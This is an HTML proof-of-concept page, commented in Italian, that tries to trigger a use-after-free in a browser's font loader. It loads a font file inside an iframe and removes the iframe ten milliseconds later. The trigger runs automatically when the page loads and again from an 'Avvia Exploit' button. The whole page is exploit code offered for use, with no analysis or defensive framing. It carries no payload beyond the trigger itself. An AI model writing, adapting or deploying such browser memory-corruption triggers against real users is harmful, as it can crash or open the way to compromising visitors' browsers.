<!DOCTYPE html>
<html>
<head>
    <title>PoC Use-After-Free</title>
    <style>
        /* Caricamento font vulnerabile */
        @font-face {
            font-family: 'uaf';
            src: url(a.ttf);
        }
        body {
            font-family: 'uaf';
        }
    </style>
    <script>
        // Funzione per forzare il caricamento del font
        function triggerUAF() {
            try {
                // Crea un iframe per isolare il contesto
                let iframe = document.createElement('iframe');
                document.body.appendChild(iframe);
                
                // Carica il font in una nuova finestra
                let doc = iframe.contentDocument;
                let style = doc.createElement('style');
                style.textContent = `
                    @font-face {
                        font-family: 'uaf';
                        src: url('a.ttf');
                    }
                    body {
                        font-family: 'uaf';
                    }
                `;
                doc.head.appendChild(style);
                doc.body.innerHTML = "<div>Loading...</div>";

                // Distruggi l'iframe per forzare il GC (Garbage Collection)
                setTimeout(() => {
                    document.body.removeChild(iframe);
                    console.log("Iframe distrutto, possibile trigger UAF.");
                }, 10);

                alert("Font trigger completato!");
            } catch (e) {
                console.error("Errore: ", e);
            }
        }

        // Avvia l'exploit
        window.onload = function() {
            alert("Avvio PoC Use-After-Free");
            triggerUAF();
        };
    </script>
</head>
<body>
    <h1>PoC DocumentFontLoader UAF</h1>
    <button onclick="triggerUAF()" style="background-color: blue; color: white; padding: 10px;">
        Avvia Exploit
    </button>
</body>
</html>
